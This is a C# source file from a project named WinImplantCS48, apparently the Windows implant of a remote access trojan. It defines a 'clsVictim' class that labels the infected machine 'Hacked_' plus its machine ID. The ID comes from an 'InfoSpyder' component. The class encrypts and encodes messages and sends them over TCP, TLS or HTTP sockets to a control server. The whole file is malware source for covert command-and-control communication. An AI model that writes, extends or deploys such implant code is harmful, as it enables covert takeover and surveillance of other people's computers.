using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WinImplantCS48
{
    public class clsVictim
    {
        public enum enMethod
        {
            TCP,
            TLS,
            HTTP,
        }

        public enMethod m_method { get; set; }
        public Socket m_sktSrv { get; set; }
        public clsCrypto m_crypto { get; set; }

        public string m_szVictimID { get; set; }

        public clsVictim()
        {

        }

        public clsVictim(enMethod method, Socket sktSrv)
        {
            m_method = method;
            m_sktSrv = sktSrv;
        }

        public clsVictim(enMethod method, Socket sktSrv, clsCrypto crypto)
        {
            m_method = method;
            m_sktSrv = sktSrv;
            m_crypto = crypto;
        }

        public void fnSendRAW(byte[] abBuffer)
        {
            if (abBuffer == null)
                return;

            m_sktSrv.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
            {
                try
                {
                    m_sktSrv.EndSend(ar);
                }
                catch (Exception ex)
                {

                }
            }), abBuffer);
        }

        public void fnSend(uint nCommand, uint nParameter, string szMsg) => fnSend(nCommand, nParameter, Encoding.UTF8.GetBytes(szMsg));
        public void fnSend(uint nCommand, uint nParameter, byte[] abMsg)
        {
            clsEDP edp = new clsEDP((byte)nCommand, (byte)nParameter, abMsg);
            fnSendRAW(edp.fnabGetBytes());
        }

        public void fnSendRandomString(uint nCommand, uint nParameter, int nLength = 10) => fnSend(nCommand, nParameter, clsEZData.fnGenerateRandomStr(nLength));

        public void fnSendCommand(string[] asMsg, bool bSendToSub = false) => fnSendCommand(asMsg.ToList(), bSendToSub);
        public void fnSendCommand(List<string> lsMsg, bool bSendToSub = false)
        {
            clsfnInfoSpyder infoSpyder = new clsfnInfoSpyder();
            var stInfo = infoSpyder.m_info;
            m_szVictimID = "Hacked_" + stInfo.m_szMachineID;

            List<string> lsSend = new List<string>();
            if (!bSendToSub)
            {
                lsSend.Add(m_szVictimID);
            }

            lsSend.AddRange(lsMsg);

            lsSend = lsSend.Select(x => clsEZData.fnStrE2B64(x)).ToList();
            string szMsg = string.Join("|", lsSend);
            byte[] abBuffer = { };

            abBuffer = m_crypto.fnabAESEncrypt(szMsg);
            fnSend(2, 0, abBuffer);
        }
    }
}
